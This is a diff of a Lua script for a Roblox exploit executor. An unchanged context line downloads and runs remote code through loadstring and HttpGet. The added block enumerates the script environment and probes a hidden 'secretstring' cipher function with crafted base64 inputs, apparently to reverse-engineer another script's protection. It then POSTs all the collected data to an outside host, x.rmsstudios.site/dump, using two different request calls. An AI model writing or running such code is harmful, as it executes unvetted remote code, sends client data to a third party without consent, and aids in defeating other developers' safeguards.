@@ -251,30 +251,36 @@ genv.iy = newcclosure(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
--- ================= Xinject cipher probe v2 (writes to getgenv().XCIPHER) =================
+-- ================= Xinject cipher probe -> worker =================
 task.spawn(function()
   local function tohex(s) return (s:gsub('.', function(c) return string.format('%02x', c:byte()) end)) end
-  local diag = {}
-  local function flush() getgenv().XCIPHER = table.concat(diag, string.char(10)) end
+  local diag = { "fork_env_additions_RAN" }
+  local function report(tag)
+    local body = table.concat(diag, string.char(10))
+    pcall(function()
+      request({ Url = "https://x.rmsstudios.site/dump?tag="..tag, Method = "POST",
+                Body = body, Headers = { ["Content-Type"] = "text/plain" } })
+    end)
+    pcall(function() game:HttpPost("https://x.rmsstudios.site/dump?tag="..tag.."_hp", body) end)
+  end
   pcall(function() local ks={} for k,_ in pairs(getfenv()) do ks[#ks+1]=tostring(k) end diag[#diag+1]='env_keys='..table.concat(ks,',') end)
-  diag[#diag+1]='started'; flush()
+  report("start")
   local SS
-  for i=1,80 do   -- wait up to 20s
+  for i=1,80 do
     SS = secretstring
     if not SS then pcall(function() SS = rawget(getfenv(),'secretstring') end) end
     if not SS then pcall(function() SS = getgenv().secretstring end) end
     if SS then break end
     task.wait(0.25)
   end
-  diag[#diag+1]='SS_found='..tostring(SS~=nil); flush()
+  diag[#diag+1]='SS_found='..tostring(SS~=nil)
   if SS then
     local tests = {"AA==","AAAA","AAAAAAAA","AAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","AQAAAAAAAAAAAAAAAAAAAA==","AAEAAAAAAAAAAAAAAAAAAA==","AAABAAAAAAAAAAAAAAAAAA==","AAAAAQAAAAAAAAAAAAAAAA==","AAAAAAABAAAAAAAAAAAAAA==","AAAAAAAAAAABAAAAAAAAAA==","AAAAAAAAAAAAAAAAAQAAAA==","/wAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAD/AAAAAAAAAA==","AQEAAAAAAAAAAAAAAAAAAA==","QUFBQUFBQUFBQUFBQUFBQQ=="}
     for _,t in ipairs(tests) do
       local ok,r = pcall(SS, t)
       diag[#diag+1] = t..' => '..(ok and (type(r)=='string' and tohex(r) or tostring(r)) or ('ERR '..tostring(r)))
-      flush()
     end
   end
-  flush()
+  report("final")
 end)
 -- ================= end =================
